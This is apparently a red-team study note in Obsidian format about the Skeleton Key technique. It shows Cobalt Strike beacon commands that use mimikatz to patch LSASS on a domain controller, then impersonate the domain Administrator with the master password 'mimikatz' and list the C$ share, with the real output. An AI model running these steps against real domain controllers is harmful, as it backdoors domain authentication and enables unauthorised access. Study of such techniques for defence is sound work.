---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Skeleton Key]]  
___

## Description:  

The Skeleton Key is only applicable to Domain Controllers - it patches LSASS to hijack the usual NTLM and Kerberos authentication flows and permits any user to be authenticated with the password `mimikatz` (their real passwords still work too).

Install the key:
```
beacon> run hostname
dc-2

beacon> mimikatz !misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```
Testing auth:

```
beacon> make_token DEV\Administrator mimikatz
[+] Impersonated DEV\bfarmer

beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     03/10/2021 14:38:44   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/10/2021 13:52:03   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     03/11/2021 12:59:29   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     03/11/2021 09:19:53   pagefile.sys
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
